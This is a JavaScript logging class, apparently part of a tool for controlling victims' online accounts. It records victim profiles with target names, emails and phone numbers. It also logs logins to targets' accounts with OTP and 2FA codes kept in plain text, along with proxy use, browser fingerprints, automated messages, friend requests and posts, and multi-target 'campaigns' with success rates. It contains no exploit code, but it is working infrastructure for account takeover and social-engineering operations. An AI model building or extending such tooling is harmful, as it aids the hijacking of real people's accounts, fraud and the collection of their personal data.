/**
 * Victim Control Logger Service
 * Specialized logging cho victim management operations với đầy đủ thông tin
 */

class VictimControlLogger {
  constructor(realTimeLogger) {
    this.realTimeLogger = realTimeLogger;
  }

  // Log victim profile operations
  logProfileOperation(operation) {
    const logEntry = {
      platform: operation.platform || "system",
      action: operation.action, // createProfile, updateProfile, deleteProfile
      status: operation.success ? "success" : "failed",

      // Detailed fields theo yêu cầu
      linkName: this.generateLinkName(operation.action, operation.platform),
      account: operation.targetAccount || operation.user,
      password: operation.credentials?.password ? "***MASKED***" : "N/A",
      otpCode: operation.credentials?.otpCode || "N/A",
      loginIP: operation.clientIP || operation.ip,
      chromeProfile: operation.chromeProfile || "Default",
      notification: this.generateNotification(operation),
      victimControlAction: operation.victimAction || operation.action,

      // Standard fields
      user: operation.user || "system",
      message: operation.message || `${operation.action} completed`,

      metadata: {
        profileId: operation.profileId,
        targetName: operation.targetName,
        targetEmail: operation.targetEmail,
        targetPhone: operation.targetPhone,
        riskLevel: operation.riskLevel,
        engagementScore: operation.engagementScore,
        campaignId: operation.campaignId,
        sessionId: operation.sessionId,
        duration: operation.duration,
        userAgent: operation.userAgent,
        browserProfile: operation.browserProfile,
        proxyUsed: operation.proxyUsed,
        automationType: operation.automationType,
        successRate: operation.successRate,
        ...operation.additionalMetadata,
      },
      category: "victim_management",
    };

    return this.realTimeLogger.logOperation(logEntry);
  }

  // Log authentication operations với đầy đủ thông tin
  logAuthentication(authData) {
    const logEntry = {
      platform: authData.platform,
      action: "authentication",
      status: authData.success ? "success" : "failed",

      // Detailed authentication fields
      linkName: `${authData.platform} Login Portal`,
      account:
        authData.account ||
        authData.email ||
        authData.username ||
        authData.phone,
      password: authData.passwordProvided ? "***MASKED***" : "N/A",
      otpCode: authData.otpCode || authData.twoFactorCode || "N/A",
      loginIP: authData.ip || authData.clientIP,
      chromeProfile:
        authData.chromeProfile || authData.profileName || "Default",
      notification: this.generateAuthNotification(authData),
      victimControlAction: authData.targetProfileId ? "target" : "none",

      user: authData.user || authData.account,
      message:
        authData.message ||
        `Authentication ${authData.success ? "successful" : "failed"}`,

      metadata: {
        attemptNumber: authData.attemptNumber || 1,
        authMethod: authData.method, // password, app_password, oauth, 2fa
        twoFactorUsed: authData.twoFactorUsed || false,
        sessionId: authData.sessionId,
        duration: authData.duration,
        userAgent: authData.userAgent,
        browserFingerprint: authData.browserFingerprint,
        proxyUsed: authData.proxyUsed,
        geolocation: authData.geolocation,
        deviceInfo: authData.deviceInfo,
        ...authData.metadata,
      },
      category: "authentication",
    };

    return this.realTimeLogger.logOperation(logEntry);
  }

  // Log automation actions với victim context
  logAutomationAction(actionData) {
    const logEntry = {
      platform: actionData.platform,
      action: actionData.action,
      status: actionData.status,

      // Detailed automation fields
      linkName: this.generateLinkName(actionData.action, actionData.platform),
      account: actionData.sourceAccount,
      password: actionData.accountPassword ? "***MASKED***" : "N/A",
      otpCode: "N/A", // Usually not needed for actions
      loginIP: actionData.ip,
      chromeProfile: actionData.chromeProfile || "Default",
      notification: this.generateActionNotification(actionData),
      victimControlAction: actionData.victimAction || "automation",

      user: actionData.user,
      message:
        actionData.message ||
        `${actionData.action} executed on ${actionData.platform}`,

      metadata: {
        targetUser: actionData.targetUser,
        targetProfile: actionData.targetProfile,
        content: actionData.content,
        messageContent: actionData.messageContent,
        campaignId: actionData.campaignId,
        batchId: actionData.batchId,
        sessionId: actionData.sessionId,
        duration: actionData.duration,
        successCount: actionData.successCount,
        failureCount: actionData.failureCount,
        automationRule: actionData.automationRule,
        ...actionData.metadata,
      },
      category: "automation",
    };

    return this.realTimeLogger.logOperation(logEntry);
  }

  // Log campaign operations
  logCampaignOperation(campaignData) {
    const logEntry = {
      platform: campaignData.platform || "multi-platform",
      action: "executeCampaign",
      status: campaignData.status,

      // Campaign-specific details
      linkName: `Campaign: ${campaignData.campaignName}`,
      account: campaignData.executorAccount,
      password: "***CAMPAIGN_AUTH***",
      otpCode: "N/A",
      loginIP: campaignData.ip,
      chromeProfile: campaignData.chromeProfile || "Campaign_Profile",
      notification: `Campaign "${campaignData.campaignName}" ${campaignData.status}`,
      victimControlAction: "campaign",

      user: campaignData.user || campaignData.executor,
      message:
        campaignData.message || `Campaign execution ${campaignData.status}`,

      metadata: {
        campaignId: campaignData.campaignId,
        campaignName: campaignData.campaignName,
        targetCount: campaignData.targetCount,
        completedTargets: campaignData.completedTargets,
        successRate: campaignData.successRate,
        startTime: campaignData.startTime,
        endTime: campaignData.endTime,
        platforms: campaignData.platforms,
        actions: campaignData.actions,
        ...campaignData.metadata,
      },
      category: "campaign",
    };

    return this.realTimeLogger.logOperation(logEntry);
  }

  // Log system events với admin context
  logSystemEvent(systemData) {
    const logEntry = {
      platform: "system",
      action: systemData.action,
      status: systemData.status,

      // System event details
      linkName: `System: ${systemData.component}`,
      account: systemData.adminUser || "system",
      password: "N/A",
      otpCode: "N/A",
      loginIP: systemData.ip || "localhost",
      chromeProfile: "System",
      notification: systemData.notification || systemData.message,
      victimControlAction: systemData.affectsVictims ? "system" : "none",

      user: systemData.user || "system",
      message: systemData.message,

      metadata: {
        component: systemData.component,
        version: systemData.version,
        affectedUsers: systemData.affectedUsers,
        affectedProfiles: systemData.affectedProfiles,
        configChanges: systemData.configChanges,
        ...systemData.metadata,
      },
      category: "system",
    };

    return this.realTimeLogger.logOperation(logEntry);
  }

  // Helper function để generate link names
  generateLinkName(action, platform) {
    const linkMappings = {
      // Authentication actions
      login: `${platform} Login Portal`,
      logout: `${platform} Logout`,

      // Communication actions
      sendMessage: `${platform} Messaging Interface`,
      sendEmail: `${platform} Email Composer`,

      // Content actions
      postContent: `${platform} Content Publisher`,
      shareContent: `${platform} Content Sharing`,
      likePost: `${platform} Post Interaction`,

      // Social actions
      followUser: `${platform} User Profile`,
      sendFriendRequest: `${platform} Friend Request`,
      joinGroup: `${platform} Group Interface`,

      // Victim management actions
      createProfile: "Victim Profile Creator",
      updateProfile: "Victim Profile Editor",
      deleteProfile: "Victim Profile Manager",
      executeCampaign: "Campaign Execution Engine",
      collectData: "Data Collection Interface",

      // Analysis actions
      analyzeProfile: "Profile Analysis Tool",
      generateReport: "Report Generator",
      exportData: "Data Export Interface",
    };

    return linkMappings[action] || `${platform} - ${action}`;
  }

  // Helper function để generate notifications
  generateNotification(operation) {
    const { action, success, platform, targetName, errorReason } = operation;

    if (success) {
      switch (action) {
        case "createProfile":
          return `✅ Profile created successfully for ${targetName || "target"}`;
        case "updateProfile":
          return `✅ Profile updated successfully for ${targetName || "target"}`;
        case "deleteProfile":
          return `✅ Profile deleted successfully`;
        case "executeCampaign":
          return `✅ Campaign executed successfully on ${platform}`;
        case "login":
          return `✅ Login successful to ${platform}`;
        case "sendMessage":
          return `✅ Message sent successfully on ${platform}`;
        case "sendEmail":
          return `✅ Email sent successfully via ${platform}`;
        default:
          return `✅ ${action} completed successfully on ${platform}`;
      }
    } else {
      switch (action) {
        case "createProfile":
          return `❌ Profile creation failed: ${errorReason || "Unknown error"}`;
        case "updateProfile":
          return `❌ Profile update failed: ${errorReason || "Unknown error"}`;
        case "deleteProfile":
          return `❌ Profile deletion failed: ${errorReason || "Unknown error"}`;
        case "login":
          return `❌ Login failed to ${platform}: ${errorReason || "Authentication error"}`;
        default:
          return `❌ ${action} failed on ${platform}: ${errorReason || "Operation error"}`;
      }
    }
  }

  // Helper function cho authentication notifications
  generateAuthNotification(authData) {
    if (authData.success) {
      let message = `✅ Authentication successful to ${authData.platform}`;
      if (authData.twoFactorUsed) {
        message += " (2FA verified)";
      }
      if (authData.method === "app_password") {
        message += " (App Password)";
      }
      return message;
    } else {
      let message = `❌ Authentication failed to ${authData.platform}`;
      if (authData.errorCode) {
        message += ` (Error: ${authData.errorCode})`;
      }
      if (authData.twoFactorRequired) {
        message += " - 2FA required";
      }
      return message;
    }
  }

  // Helper function cho action notifications
  generateActionNotification(actionData) {
    const { action, status, platform, targetUser, content } = actionData;

    if (status === "success") {
      switch (action) {
        case "sendMessage":
          return `✅ Message sent to ${targetUser || "contact"} on ${platform}`;
        case "sendEmail":
          return `✅ Email sent to ${targetUser || "recipient"} via ${platform}`;
        case "postContent":
          return `✅ Content posted successfully on ${platform}`;
        case "followUser":
          return `✅ Successfully followed ${targetUser || "user"} on ${platform}`;
        case "likePost":
          return `✅ Post liked successfully on ${platform}`;
        case "sendFriendRequest":
          return `✅ Friend request sent to ${targetUser || "user"} on ${platform}`;
        case "joinGroup":
          return `✅ Successfully joined group on ${platform}`;
        default:
          return `✅ ${action} completed successfully on ${platform}`;
      }
    } else {
      return `❌ ${action} failed on ${platform}${actionData.errorReason ? ": " + actionData.errorReason : ""}`;
    }
  }
}

export default VictimControlLogger;
